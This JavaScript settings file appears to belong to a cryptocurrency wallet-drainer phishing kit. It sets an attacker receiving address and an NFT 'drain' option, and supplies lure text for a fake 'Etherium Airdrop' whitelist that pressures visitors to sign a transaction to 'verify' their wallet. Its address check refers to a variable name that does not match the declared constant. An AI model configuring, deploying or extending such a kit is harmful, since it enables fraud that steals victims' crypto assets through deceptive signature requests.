const receiverAddress = "0x8d12a197cb00d4747a1fe03395095ce2a5cc6819";

const drainNftInfo = {
    active: false,   
    minValue: 0.1,  
    nftReceiveAddress: "" 
    }

const collectionInfo = {
    name: "Etherium Airdrop",
    socialMedia: {
        discord: "https://discord.com",
        twitter: "https://twitter.com",
        instagram: "https://instagram.com",
    },
}

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "Last Chance To Become Whitelisted!",
}

const claimPageInfo = {
    title: "CLAIM<br>WHITELIST", // <br> is a line break
    shortDescription: "12 Hours Left!",
    longDescription: "As We're Minting Soon We Are Giving Away 50 Whitelist Spots To People Who Support Us! All You Need To Do Is Sign The Transaction To Verify Your Wallet For Mint Date! <br>If You Are Already Whitelisted, After Verifying Your Wallet You Will Be Eligible For Our Free Etherium Airdrop!",

    claimButtonText: "CLAIM NOW",

    image: "ola.jpg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}



const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
